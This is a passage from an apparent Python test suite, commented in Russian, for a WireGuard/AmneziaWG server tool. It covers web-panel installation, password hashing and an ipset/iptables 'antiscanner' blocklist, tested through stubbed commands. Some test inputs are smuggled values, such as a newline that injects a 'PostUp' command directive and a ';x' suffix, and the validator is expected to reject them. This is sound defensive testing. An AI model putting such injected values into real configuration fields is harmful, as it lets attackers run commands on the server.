    "откатом" in out and "v9.9.9" in open(target).read(), out)
rc, out, _ = bash("_script_ver " + new_d + "; echo; _script_ver " + target)
chk("версия копии читается с буквой сборки", out.split() == ["v1.2.0d", "v9.9.9"], out)

rc, out, _ = bash('server_exists() { return 1; }; cascade_count() { echo 0; }; wgobf_installed() { return 1; }; '
                  'MOD_SRC_DIR=/nonexistent; echo v1.2.0 > "$STATE_DIR/version"; helpers_refresh; cat "$STATE_DIR/version"; '
                  'echo "--$_BUILD_SUM--$VERSION_SHOW"')
mark, _, rest = out.strip().partition("\n--")
bsum, _, ver = rest.partition("--")
chk("служебные скрипты пересобираются и для новой сборки той же версии",
    len(bsum) == 16 and ver.startswith("v1.") and mark == f"{ver} {bsum}", out)

print("\n── Веб-панель (awg2) ──")
WEBC = os.path.join(TMP, "awg-web.conf")
WEBPRE = (f'WEB_CONF="{WEBC}"; WEB_LOG="{TMP}/awg-web.log"; WEB_DIR="{TMP}/awg-web"; BOT_DIR="{TMP}/awg-bot"; '
          'web_code_ready() { return 0; }; AUTO_MODE=0; ')
with open(ACTIVE, "a") as f:
    f.write("awg-web.service\n")
rc, out, _ = bash(WEBPRE + "web_install 2>&1; echo rc=$?", stdin="admin2\nSuperSecret123\nSuperSecret123\n")
out = re.sub(r"\x1b\[[0-9;]*m", "", out)
conf = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
unit = open(os.path.join(ROOT, "units", "awg-web.service")).read()
chk("установка: логин, хеш scrypt вместо пароля, случайные порт и путь, конфиг 600",
    "rc=0" in out and conf.get("WEB_USER") == "admin2" and conf.get("WEB_PASS", "").startswith("scrypt$16384$8$1$")
    and 20000 <= int(conf.get("WEB_PORT", 0)) < 60000 and re.fullmatch(r"[A-Za-z0-9]{14}", conf.get("WEB_PATH", ""))
    and os.stat(WEBC).st_mode & 0o777 == 0o600 and "SuperSecret123" not in open(WEBC).read(), [out[-500:], conf])
chk("введённый пароль на экран не выводится, адрес с портом и секретным путём — выводится",
    "SuperSecret123" not in out and f":{conf.get('WEB_PORT')}/{conf.get('WEB_PATH')}/" in out, out[-500:])
chk("служба awg-web: python -m awgbot.web из кода бота, конфиг и журнал панели",
    "ExecStart=" in unit and "-m awgbot.web" in unit and f"AWG_WEB_CONF={WEBC}" in unit, unit)
old_hash = conf["WEB_PASS"]
rc, out, _ = bash(WEBPRE + "web_install 2>&1", stdin="\n\n")
out = re.sub(r"\x1b\[[0-9;]*m", "", out)
m = re.search(r"Пароль: ([A-Za-z0-9]{18}) ", out)
conf2 = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("Enter вместо пароля — сгенерирован и показан один раз; порт и путь прежние",
    m and conf2["WEB_PASS"] != old_hash and conf2["WEB_PORT"] == conf["WEB_PORT"] and conf2["WEB_PATH"] == conf["WEB_PATH"],
    out[-500:])
rc, out, _ = bash(WEBPRE + "printf '%s' 'Пароль 123' | py web-hash")
chk("хеш пароля: соль каждый раз новая", out.strip().startswith("scrypt$") and out.strip() != conf2["WEB_PASS"], out)
# Порт панели и её правило в UFW: «awg-web» — не подстрока для «awg-webapp» Mini App
UFWST = os.path.join(TMP, "ufw-rules")
with open(UFWST, "w") as f:
    f.write("8443/tcp ALLOW IN Anywhere # awg-webapp\n41234/tcp ALLOW IN Anywhere # awg-web\n"
            "51820/udp ALLOW IN Anywhere # AmneziaWG\n41234/tcp (v6) ALLOW IN Anywhere (v6) # awg-web\n")
UFWFN = ('ufw() { case "$1" in status) awk \'{printf "[%2d] %s\\n", NR, $0}\' "' + UFWST + '" ;; '
         '--force) sed -i "${3}d" "' + UFWST + '" ;; esac; }; ')
rc, out, _ = bash(UFWFN + 'ufw_delete_comment awg-web; cat "' + UFWST + '"')
chk("UFW: правила веб-панели удалены (и v6), порт Mini App «awg-webapp» и AmneziaWG — на месте",
    out.split("\n")[:2] == ["8443/tcp ALLOW IN Anywhere # awg-webapp", "51820/udp ALLOW IN Anywhere # AmneziaWG"]
    and "# awg-web\n" not in out, out)
rc, out, _ = bash(WEBPRE + 'web_port_busy() { return 1; }; web_restart() { :; }; web_show_access() { :; }; '
                  'web_set_port 2>&1 <<< "010000"; web_conf_get WEB_PORT')
chk("порт панели с ведущим нулём — десятичный (10000), а не восьмеричный", out.strip().splitlines()[-1] == "10000", out)
rc, out, _ = bash(WEBPRE + 'web_ask_password 2>&1 <<< "$(printf "%0300d\\n%0300d\\n" 1 1)"; echo "rc=$?"', stdin=None)
chk("пароль длиннее 256 символов — отказ (вход принимает до 256)", "Не больше 256" in out, out[-300:])
rc, out, _ = bash(f'BOT_DIR="{TMP}/botcode"; mkdir -p "$BOT_DIR"; '
                  'web_installed() { true; }; bot_installed && echo BOT || echo NOBOT; '
                  'web_installed() { false; }; bot_installed && echo BOT || echo NOBOT')
chk("код для одной веб-панели — ещё не бот; без панели каталог кода — бот (как раньше)", out.split() == ["NOBOT", "BOT"], out)
rc, out, _ = bash(WEBPRE + "main_menu", stdin="0\n")
chk("главное меню: пункт w) Веб-панель", "w)" in out and "Веб-панель" in out, out[-600:])
# api web — экран «Веб-панель» в боте: адрес, новый пароль, новый путь
WEBAPI = WEBPRE + f'web_installed() {{ [[ -f "{ROOT}/units/awg-web.service" ]]; }}; web_restart() {{ ok "Веб-панель работает"; }}; '
rc, out, _ = bash(WEBAPI + "api_main web status")
st = json.loads(out)["data"]
conf = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("api web status: установлена, адрес с портом и секретным путём, логин; пароля в ответе нет",
    st.get("installed") is True and st.get("url", "").endswith(f":{conf['WEB_PORT']}/{conf['WEB_PATH']}/")
    and st.get("user") == "admin2" and "password" not in st, st)
rc, out, _ = bash(WEBAPI + "api_main web password")
r = json.loads(out)
conf2 = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
pw = (r.get("data") or {}).get("password", "")
chk("api web password: новый пароль — в ответе один раз, на сервере только новый хеш",
    r.get("ok") and re.fullmatch(r"[A-Za-z0-9]{18}", pw) and conf2["WEB_PASS"] != conf["WEB_PASS"]
    and pw not in open(WEBC).read() and pw not in r.get("log", ""), r)
_, n_, r_, p_, salt_, want_ = conf2["WEB_PASS"].split("$")
chk("новый пароль подходит к сохранённому хешу",
    hashlib.scrypt(pw.encode(), salt=base64.b64decode(salt_), n=int(n_), r=int(r_), p=int(p_), dklen=32)
    == base64.b64decode(want_), conf2["WEB_PASS"])
rc, out, _ = bash(WEBAPI + "api_main web path")
r = json.loads(out)
conf3 = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("api web path: новый секретный путь, порт прежний",
    r.get("ok") and conf3["WEB_PATH"] != conf2["WEB_PATH"] and r["data"]["url"].endswith(f"/{conf3['WEB_PATH']}/")
    and conf3["WEB_PORT"] == conf2["WEB_PORT"] and not r["data"].get("password"), r)
rc, out, _ = bash(WEBAPI + "api_main web install")
chk("api web install поверх установленной — отказ (пароль не перезаписывается молча)",
    not json.loads(out).get("ok"), out)
rc, out, _ = bash(WEBPRE + f'remove_unit() {{ rm -f "{ROOT}/units/$1"; }}; ' + "web_remove quiet 2>&1; ls " + f'"{WEBC}" 2>&1; ls "{ROOT}/units/awg-web.service" 2>&1')
chk("удаление: конфиг и служба убраны", "No such file" in out and out.count("No such file") == 2, out)
rc, out, _ = bash(WEBAPI + "ufw_allow() { :; }; api_main web install")
r = json.loads(out)
conf = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("api web install (бот): логин admin, пароль сгенерирован и выдан, случайные порт и путь",
    r.get("ok") and r["data"].get("user") == "admin" and re.fullmatch(r"[A-Za-z0-9]{18}", r["data"].get("password", ""))
    and conf.get("WEB_PASS", "").startswith("scrypt$") and r["data"]["url"].endswith(f":{conf['WEB_PORT']}/{conf['WEB_PATH']}/"),
    r)

print("\n── Антисканер ──")
# Заглушки с состоянием: ipset (наборы — файлами), iptables/ip6tables (правила
# INPUT — файлом, -I ставит первым), iptables-save -c (счётчики), curl — отдаёт
# списки из каталога ASLISTS. Сеть не нужна.
ASBIN = os.path.join(TMP, "asbin")
ASLISTS = os.path.join(TMP, "aslists")
IPSET_DIR = os.path.join(TMP, "ipset")
IPT_RULES = os.path.join(TMP, "ipt-rules")
for d in (ASBIN, ASLISTS, os.path.join(IPSET_DIR, "sets"), os.path.join(IPSET_DIR, "gone")):
    os.makedirs(d, exist_ok=True)
AS_STUBS = {
    "ipset": r"""echo "ipset $*" >> "$CALLS"
S="$IPSET_DIR/sets"
case "$1" in
  restore) while read -r op name rest; do
             case "$op" in
               create) touch "$S/$name" ;;
               flush) : > "$S/$name" ;;
               add) e="${rest% -exist}"; echo "$e" >> "$S/$name" ;;
             esac
           done ;;
  create) touch "$S/$2" ;;
  add) e="${*:3}"; e="${e% -exist}"; echo "$e" >> "$S/$2" ;;
  swap) [[ -f "$S/$2" && -f "$S/$3" ]] || exit 1; mv "$S/$2" "$S/.t"; mv "$S/$3" "$S/$2"; mv "$S/.t" "$S/$3" ;;
  destroy) [[ -f "$S/$2" ]] || exit 1; mv -f "$S/$2" "$IPSET_DIR/gone/$2" ;;
  list) if [[ "$2" == -n ]]; then [[ -f "$S/$3" ]] && echo "$3"; [[ -f "$S/$3" ]]; exit; fi
        [[ -f "$S/$2" ]] || exit 1
        echo "Name: $2"; echo "Members:"
        while read -r e flag; do
          n=$(awk -v e="$e" '$1 == e {print $2}' "$IPSET_DIR/hits" 2>/dev/null)
          if [[ "$flag" == nomatch ]]; then echo "$e nomatch packets 0 bytes 0"; else echo "$e packets ${n:-0} bytes 0"; fi
        done < "$S/$2" ;;
esac
exit 0""",
    "iptables": r"""echo "${0##*/} $*" >> "$CALLS"
f="$IPT_RULES.${0##*/}"; touch "$f"
case "$1" in
  -C) shift; c="$1"; shift; grep -qxF -- "$c $*" "$f" ;;
  -I) shift; c="$1"; shift 2; { echo "$c $*"; cat "$f"; } > "$f.n"; mv "$f.n" "$f" ;;
  -A) shift; c="$1"; shift; echo "$c $*" >> "$f" ;;
  -D) shift; c="$1"; shift; grep -qxF -- "$c $*" "$f" || exit 1
      awk -v r="$c $*" 'BEGIN {d = 0} !d && $0 == r {d = 1; next} {print}' "$f" > "$f.n"; mv "$f.n" "$f" ;;
  -S) echo "-P $2 ACCEPT"; grep "^$2 " "$f" | sed "s/^$2 /-A $2 /" ;;
  *) exit 0 ;;
esac""",
    "iptables-save": r"""t="${0##*/}"; t="${t%-save}"
if [[ " $* " == *" -c "* ]]; then
  sed "s/^/[$(cat "$IPT_RULES.$t.cnt" 2>/dev/null || echo 0):0] -A /" "$IPT_RULES.$t" 2>/dev/null
else cat "$IPT_SAVE"; fi""",
    "curl": r"""out="" url=""
while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; -*) shift ;; *) url="$1"; shift ;; esac; done
echo "curl $url" >> "$CALLS"
sleep "${FAKE_CURL_SLEEP:-0}"
src="$ASLISTS/${url##*/}"
[[ -f "$src" && -n "$out" ]] || exit 22
cp "$src" "$out" """,
    "ip": r"""if [[ "$*" == "-o addr show scope global" ]]; then
  for a in ${FAKE_ADDRS:-}; do echo "2: eth0    inet $a/24 brd 255.255.255.255 scope global eth0"; done; exit 0
fi
PATH="${PATH#"${0%/*}:"}" exec ip "$@"
""",
    "ss": r"""[[ -n "${FAKE_SSH_PEER:-}" ]] && echo "0 0 203.0.113.10:22 $FAKE_SSH_PEER:51000 users:((\"sshd\",pid=1,fd=4))"
exit 0""",
}
for name, body in AS_STUBS.items():
    with open(os.path.join(ASBIN, name), "w") as f:
        f.write("#!/usr/bin/env bash\n" + body + "\n")
    os.chmod(os.path.join(ASBIN, name), 0o755)
for alias, target in (("ip6tables", "iptables"), ("ip6tables-save", "iptables-save")):
    shutil.copy(os.path.join(ASBIN, target), os.path.join(ASBIN, alias))
# Синтетические списки: мусор, частные сети, слишком широкие — отбрасываются
with open(os.path.join(ASLISTS, "antiscanner.list"), "w") as f:
    f.write("# сканеры\n10.0.0.0/8\n1.0.0.0/4\n999.1.1.0/24\n01.2.3.4\n5.6.7.0/24 # с комментарием\n"
            "8.8.8.8\n192.168.1.0/24\n100.64.1.0/24\nfoo bar\n1.2.3.4/24/5\n"
            "2a0c:a9c7:157::/48\nfe80::/10\n2001:db8::/32\n2a0c::1::2/64\n2a0c:a9c7:158::/48/9\n"
            + "".join(f"31.{i}.0.0/16\n" for i in range(1, 21)))
with open(os.path.join(ASLISTS, "skipa.list"), "w") as f:
    f.write("".join(f"212.41.12.{i}/32\n" for i in range(1, 25)))


def gov_list(n):
    out = []
    for i in range(n):
        out.append(f"# Networks announced by AS{1000 + i}\n# AS-Name: TEST-{i}\n# Org {i} MVD\n# Moscow, Russia\n"
                   f"77.{i // 250}.{i % 250}.0/24\n")
    return "\n".join(out)


with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(320))
ASENV = {"PATH": ASBIN + ":" + ENV["PATH"], "IPSET_DIR": IPSET_DIR, "IPT_RULES": IPT_RULES, "ASLISTS": ASLISTS}
ASPRE = f'export PATH="{ASBIN}:$PATH" IPSET_DIR="{IPSET_DIR}" IPT_RULES="{IPT_RULES}" ASLISTS="{ASLISTS}"; '


def ipset_set(name):
    try:
        return open(os.path.join(IPSET_DIR, "sets", name)).read().split("\n")[:-1]
    except OSError:
        return None


def ipt(fam=4):
    try:
        return open(f"{IPT_RULES}.{'iptables' if fam == 4 else 'ip6tables'}").read().split("\n")[:-1]
    except OSError:
        return []


rc, out, _ = bash(f'_antiscan_parse 4 < "{ASLISTS}/antiscanner.list" | head -4')
chk("разбор IPv4: мусор, частные и слишком широкие сети отброшены",
    out.split()[:3] == ["5.6.7.0/24", "8.8.8.8/32", "31.1.0.0/16"], out)
rc, out, _ = bash(f'_antiscan_parse 6 < "{ASLISTS}/antiscanner.list"')
chk("разбор IPv6: только глобальные, без link-local, документационных и кривых", out.split() == ["2a0c:a9c7:157::/48"], out)
rc, out, _ = bash('printf "10.1.2.3\\n1.2.3.4/8\\n1.2.3.4/7\\n" | _antiscan_parse 4 1')
chk("исключения: частные адреса можно, но не шире /8", out.split() == ["10.1.2.3/32", "1.0.0.0/8"], out)
# Одинокое «:» с краю — не IPv6: одна такая запись роняла бы весь ipset restore (набор IPv6 снимался целиком)
for mode in ("0", "1"):
    rc, out, _ = bash(f'printf "2a0c::1:\\n:2a0c::1\\n1::2:\\n::1:\\n2a0c:1::\\n2a0c::1\\n" | _antiscan_parse 6 {mode}')
    chk(f"разбор IPv6 (allow={mode}): одинокое «:» с краю отброшено, верные записи остались",
        out.split() == ["2a0c:1::/128", "2a0c::1/128"], out)

reset_calls()
r = api("antiscan", "on", env=dict(ASENV, FAKE_SSH_PEER="77.0.5.9", SSH_CONNECTION="77.0.7.7 5000 203.0.113.10 22"))
v4 = ipset_set("awg2-antiscan") or []
chk("api antiscan on: списки скачаны, набор собран, правило первым в INPUT",
    r.get("ok") and "31.1.0.0/16" in v4 and "212.41.12.1/32" in v4 and "77.0.5.0/24" in v4
    and "10.0.0.0/8" not in v4 and ipt(4)[:1] == ["INPUT -m conntrack --ctstate NEW -m set --match-set awg2-antiscan src "
                                                  "-m comment --comment awg2-antiscan -j DROP"], [r, ipt(4), v4[:5]])
chk("IPv6 — свой набор и правило в ip6tables", ipset_set("awg2-antiscan6") == ["2a0c:a9c7:157::/48"]
    and any("awg2-antiscan6" in x for x in ipt(6)), [ipset_set("awg2-antiscan6"), ipt(6)])
allow = open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
chk("SSH-адреса из списка — в исключения насовсем, в наборе nomatch",
    "77.0.7.7 # SSH" in allow and "77.0.5.9 # SSH" in allow
    and "77.0.7.7/32 nomatch" in v4 and "77.0.5.9/32 nomatch" in v4, [allow, [x for x in v4 if "nomatch" in x]])
units = os.listdir(os.path.join(ROOT, "units"))
svc = open(os.path.join(ROOT, "units", "awg2-antiscan.service")).read()
chk("служба при загрузке — раньше UFW и netfilter-persistent; таймер раз в час",
    {"awg2-antiscan.service", "awg2-antiscan-update.service", "awg2-antiscan-update.timer"} <= set(units)
    and "Before=network-pre.target ufw.service netfilter-persistent.service" in svc
    and "systemctl enable --now awg2-antiscan-update.timer" in calls(), units)

with open(f"{IPT_RULES}.iptables.cnt", "w") as f:
    f.write("42")
with open(os.path.join(IPSET_DIR, "hits"), "w") as f:
    f.write("77.0.3.0/24 30\n31.2.0.0/16 12\n")
r = api("antiscan", "status", env=ASENV)
d = r.get("data") or {}
lists = {x["id"]: x for x in d.get("lists") or []}
chk("api antiscan status: включён, правило на месте, счётчик, списки, кто стучался — с организацией",
    r.get("ok") and d.get("enabled") and d.get("active") and d.get("dropped") == 42 and d.get("v4", 0) > 340
    and lists["gov"]["entries"] == 320 and lists["scan"]["on"]
    and d["top"][0] == {"packets": 30, "net": "77.0.3.0/24", "org": "Org 3 MVD"}
    and "77.0.7.7" in d.get("allow", []), d)

# Оборванный ответ не заменяет прежний список
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(12))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("короткий ответ сервера списков — прежний список остаётся, ошибка сказана",
    r.get("ok") and {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "оставлен прежний" in d.get("error", ""),
    [r, d])
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write("".join(f"{20 + i // 16777216}.{i // 65536 % 256}.{i // 256 % 256}.{i % 256}\n" for i in range(200001)))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("раздутый ответ (больше предела применения) — прежний список остаётся, а не ломает применение",
    r.get("ok") and {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "оставлен прежний" in d.get("error", ""),
    [r, d.get("error"), d.get("lists")])
# Подменённый источник: тысячи /12 — записей в меру, но закрыли бы почти весь IPv4
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write("".join(f"{i // 16 % 223 + 1}.{i % 16 * 16}.0.0/12\n" for i in range(3500)))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("охват шире 2^24 адресов IPv4 (тысячи /12) — прежний список остаётся, ошибка в статусе и журнале",
    {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "охват" in d.get("error", "")
    and "охват" in open(os.path.join(ROOT, "antiscan.log")).read(), [r, d.get("error"), d.get("lists")])
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(320) + "\n" + "".join(f"2a{i:02x}:ff00::/24\n" for i in range(20)))
r = api("antiscan", "update", env=ASENV)
d = api("antiscan", "status", env=ASENV).get("data") or {}
chk("IPv6: охват больше 4096 сетей /32 — прежний список остаётся",
    {x["id"]: x for x in d["lists"]}["gov"]["entries"] == 320 and "охват" in d.get("error", ""), [r, d.get("error")])
with open(os.path.join(ASLISTS, "government_networks.list"), "w") as f:
    f.write(gov_list(320))

# Правило сдвинули (fail2ban вставил своё первым) — таймер возвращает его наверх без скачивания
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("INPUT -j f2b-sshd\n" + "\n".join(x for x in ipt(4) if "f2b" not in x) + "\n")
api("antiscan", "update", env=ASENV)           # ошибка прошлого шага ушла, UPDATED свежий
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("INPUT -j f2b-sshd\n" + "\n".join(x for x in ipt(4) if "f2b" not in x) + "\n")
reset_calls()
rc, out, err = bash(ASPRE + 'bash "$ANTISCAN_SCRIPT" heal; echo "rc=$?"')
chk("таймер: правило снова первое, списки не качались (обновлены меньше суток назад)",
    "rc=0" in out and ipt(4)[0].endswith("--comment awg2-antiscan -j DROP") and "curl" not in calls()
    and ipt(4).count("INPUT -j f2b-sshd") == 1, [out, err, ipt(4)])
# Выше нашего — DROP обфускатора и ACCEPT DNS только с awg0: сканер через них не
# пройдёт, правило не двигается (и не дёргается каждый час)
OURS = [x for x in ipt(4) if "awg2-antiscan" in x]
SAFE = ["INPUT ! -i lo -p udp --dport 51821 -j DROP -m comment --comment awg-wgobf",
        "INPUT -i awg0 -d 10.23.45.1 -p udp --dport 5353 -j ACCEPT -m comment --comment awg2-dns"]
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("\n".join(SAFE + OURS + ["INPUT -j ufw-before-input"]) + "\n")
reset_calls()
rc, out, _ = bash(ASPRE + 'antiscan_rules_ok && echo OK; bash "$ANTISCAN_SCRIPT" heal')
chk("туннели Тулзы выше правила (DROP обфускатора, DNS с awg0) — правило на месте, не двигается",
    "OK" in out and ipt(4)[:3] == SAFE + OURS[:1] and "-D INPUT" not in calls(), [out, ipt(4)])
with open(f"{IPT_RULES}.iptables", "w") as f:
    f.write("\n".join(["INPUT -j ufw-before-input", "INPUT ! -i awg0 -p tcp --dport 22 -j ACCEPT"] + OURS) + "\n")
rc, out, _ = bash(ASPRE + 'antiscan_rules_ok || echo MOVED; bash "$ANTISCAN_SCRIPT" heal')
chk("переход в UFW или ACCEPT не только для своих интерфейсов выше — правило снова наверх",
    "MOVED" in out and "awg2-antiscan" in ipt(4)[0], [out, ipt(4)])
rc, out, _ = bash(ASPRE + 'sed -i "s/^UPDATED=.*/UPDATED=1/" "$ANTISCAN_CONF"; bash "$ANTISCAN_SCRIPT" heal; '
                  'grep -c "^curl" "$CALLS"')
chk("таймер: списки старше суток — скачивает заново", out.strip().endswith("3"), out)

# Адреса сервера: на загрузке (служба раньше сети) их нет, при смене адреса исключения
# устаревают — таймер пересобирает набор без скачивания; тот же набор адресов не трогает
rc, out, _ = bash(ASPRE + 'FAKE_ADDRS="77.0.9.9" bash "$ANTISCAN_SCRIPT" apply; echo "rc=$?"')
a1 = "77.0.9.9/32 nomatch" in (ipset_set("awg2-antiscan") or [])
reset_calls()
rc, out2, _ = bash(ASPRE + 'FAKE_ADDRS="77.0.9.9" bash "$ANTISCAN_SCRIPT" heal; echo "rc=$?"')
a2 = "ipset restore" not in calls()
rc, out3, _ = bash(ASPRE + 'FAKE_ADDRS="77.0.9.9 77.0.8.8" bash "$ANTISCAN_SCRIPT" heal; echo "rc=$?"')
a3 = "77.0.8.8/32 nomatch" in (ipset_set("awg2-antiscan") or []) and "curl" not in calls()
chk("таймер: адреса сервера те же — набор не пересобирается; сменились — исключения обновлены без скачивания",
    a1 and a2 and a3 and "rc=0" in out + out2 + out3, [a1, a2, a3, out, out2, out3])
# Прерванная загрузка оставляет временный набор — выключение убирает и его
open(os.path.join(IPSET_DIR, "sets", "awg2-antiscan-new"), "w").close()
rc, out, _ = bash(ASPRE + 'antiscan_down')
chk("выключение убирает временный набор прерванной загрузки",
    ipset_set("awg2-antiscan-new") is None and ipset_set("awg2-antiscan") is None, [out, ipset_set("awg2-antiscan-new")])
api("antiscan", "update", env=ASENV)   # вернуть набор для следующих проверок

r = api("antiscan", "allow", "add", "8.8.4.0/24", env=ASENV)
r2 = api("antiscan", "allow", "add", "1.2.3.4\nPostUp = x", env=ASENV)
r3 = api("antiscan", "allow", "add", "300.1.1.1", env=ASENV)
chk("исключение: подсеть добавлена и сразу в наборе (nomatch); мусор — отказ",
    r.get("ok") and "8.8.4.0/24 nomatch" in (ipset_set("awg2-antiscan") or []) and not r2.get("ok") and not r3.get("ok"),
    [r, r2, r3])
r = api("antiscan", "allow", "del", "8.8.4.0/24", env=ASENV)
r2 = api("antiscan", "allow", "del", "9.9.9.9", env=ASENV)
chk("исключение убрано; несуществующее — ошибка",
    r.get("ok") and "8.8.4.0" not in open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read() and not r2.get("ok"),
    [r, r2])
r = api("antiscan", "allow", "add", "1.0.0.0/4", env=ASENV)
r2 = api("antiscan", "allow", "add", "2a0c::/8", env=ASENV)
r3 = api("antiscan", "allow", "add", "300.1.1.1/4", env=ASENV)
chk("исключение шире /8 (IPv4) или /16 (IPv6) — своим текстом, а не «нужен адрес»",
    "Слишком широкая" in r.get("error", "") and "Слишком широкая" in r2.get("error", "")
    and "Нужен IPv4 или IPv6" in r3.get("error", ""), [r.get("error"), r2.get("error"), r3.get("error")])

# Широкое исключение перекрывает узкие записи списка: в hash:net побеждает самый
# узкий префикс, поэтому записи внутри исключения в набор не идут
api("antiscan", "allow", "add", "212.41.12.0/24", env=ASENV)
api("antiscan", "allow", "add", "31.1.2.0/24", env=ASENV)
r = api("antiscan", "allow", "add", "2a0c:a9c7::/32", env=ASENV)
v4, v6 = ipset_set("awg2-antiscan") or [], ipset_set("awg2-antiscan6") or []
chk("исключение шире записей списка: записи внутри него не в наборе (IPv4 и IPv6), шире — остаются",
    r.get("ok") and not any(x.startswith("212.41.12.") and "nomatch" not in x for x in v4)
    and "212.41.12.0/24 nomatch" in v4 and "31.1.0.0/16" in v4 and "31.1.2.0/24 nomatch" in v4
    and "2a0c:a9c7:157::/48" not in v6, [r, [x for x in v4 if x.startswith(("212.", "31.1."))], v6])
for a in ("212.41.12.0/24", "31.1.2.0/24", "2a0c:a9c7::/32"):
    api("antiscan", "allow", "del", a, env=ASENV)
chk("исключение убрано — записи списка снова в наборе",
    "212.41.12.5/32" in (ipset_set("awg2-antiscan") or []) and "2a0c:a9c7:157::/48" in (ipset_set("awg2-antiscan6") or []),
    [ipset_set("awg2-antiscan6")])

# Адрес того, кто включает из панели или Mini App (AWG_CLIENT_IP от бота), и
# IPv6-адрес SSH-сессии внутри списка — в исключения насовсем
for ip in ("77.0.6.6", "8.8.4.4", "::ffff:77.0.6.8", "2a0c:a9c7:157::5", "77.0.6.7;x", "77.0.6.9\n1.1.1.1", "77.0.6"):
    api("antiscan", "update", env=dict(ASENV, AWG_CLIENT_IP=ip))
allow = open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
rows = [x.split()[0] for x in allow.splitlines() if x.strip()]
chk("адрес клиента панели внутри списка — в исключения (IPv4, IPv4 в IPv6, IPv6); снаружи и мусор — нет",
    "77.0.6.6 # панель" in allow and "77.0.6.8 # панель" in allow and "2a0c:a9c7:157::5 # панель" in allow
    and not any(x.startswith(("8.8.4.4", "77.0.6.7", "77.0.6.9", "1.1.1.1")) or x == "77.0.6" for x in rows)
    and "77.0.6.6/32 nomatch" in (ipset_set("awg2-antiscan") or []), allow)
api("antiscan", "update", env=dict(ASENV, AWG_CLIENT_IP="77.0.6.6"))
chk("повторное включение с того же адреса — без дубля", open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
    .count("77.0.6.6 ") == 1, allow)
api("antiscan", "update", env=dict(ASENV, SSH_CONNECTION="2a0c:a9c7:157::9 5000 2001:db8::1 22"))
allow = open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
chk("IPv6-адрес SSH-сессии внутри списка — в исключения насовсем",
    "2a0c:a9c7:157::9 # SSH" in allow and "2a0c:a9c7:157::9/128 nomatch" in (ipset_set("awg2-antiscan6") or []), allow)

r = api("antiscan", "allow", env=ASENV)
chk("allow без аргументов — ответ JSON с отказом, а не обрыв без ответа (set -u)", r.get("ok") is False and r.get("_rc") != 0, r)

r = api("antiscan", "lists", "scan,skipa", env=ASENV)
v4 = ipset_set("awg2-antiscan") or []
r2 = api("antiscan", "lists", "foo", env=ASENV)
chk("списки: без госсетей — их подсетей в наборе нет; неизвестный список — отказ",
    r.get("ok") and "31.1.0.0/16" in v4 and "77.0.5.0/24" not in v4 and not r2.get("ok"), [r, r2])

heal = os.path.join(ROOT, "var/lib/awg2/antiscan/heal")
with open(heal, "a"):
    pass
os.utime(heal, (time.time() - 4 * 3600,) * 2)
reset_calls()
rc, out, _ = bash(ASPRE + "antiscan_watchdog")
chk("сторож: таймер молчал больше трёх часов — перезапуск",
    "systemctl start --no-block awg2-antiscan-update.service" in calls(), calls())

# Проход таймера уже увидел ON=1 и качает списки, а в это время выключают:
# выключение ждёт его замок, проход перед применением видит ON=0 — правило не возвращается
timer = subprocess.Popen(["bash", "-c", PRELUDE + ASPRE + 'FAKE_CURL_SLEEP=1 bash "$ANTISCAN_SCRIPT" update'],
                         env=dict(ENV, **ASENV), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(0.7)
r = api("antiscan", "off", env=ASENV)
timer.wait(60)
chk("выключение во время прохода таймера: правило и наборы не возвращаются",
    r.get("ok") and not any("awg2-antiscan" in x for x in ipt(4) + ipt(6))
    and ipset_set("awg2-antiscan") is None and ipset_set("awg2-antiscan6") is None, [r, ipt(4), ipt(6)])
r = api("antiscan", "off", env=ASENV)
chk("api antiscan off: правила сняты, наборы удалены, службы убраны",
    r.get("ok") and not any("awg2-antiscan" in x for x in ipt(4) + ipt(6))
    and ipset_set("awg2-antiscan") is None and ipset_set("awg2-antiscan6") is None, [r, ipt(4), ipt(6)])
rc, out, _ = bash(ASPRE + 'bash "$ANTISCAN_SCRIPT" apply; echo "rc=$?"; ls "$IPSET_DIR/sets"')
chk("выключен — служба при загрузке ничего не ставит", out.split() == ["rc=0"], out)
rc, out, _ = bash(ASPRE + 'antiscan_remove; ls "$ANTISCAN_DIR" "$ANTISCAN_SCRIPT" 2>&1')
chk("удаление вместе со скриптом: каталог и скрипт убраны", out.count("No such file") == 2, out)

print("\n── WG + обфускатор: клиенты с трафиком ──")
os.makedirs(os.path.join(ROOT, "etc/awg-wgobf"), exist_ok=True)
os.makedirs(os.path.join(ROOT, "etc/wireguard"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-wgobf/state"), "w") as f:
    f.write("PORT=41000\nENDPOINT=203.0.113.10\nMASKING=STUN\nKEY=k\nNET=10.66.66.0/24\nWG_PORT=51900\n")
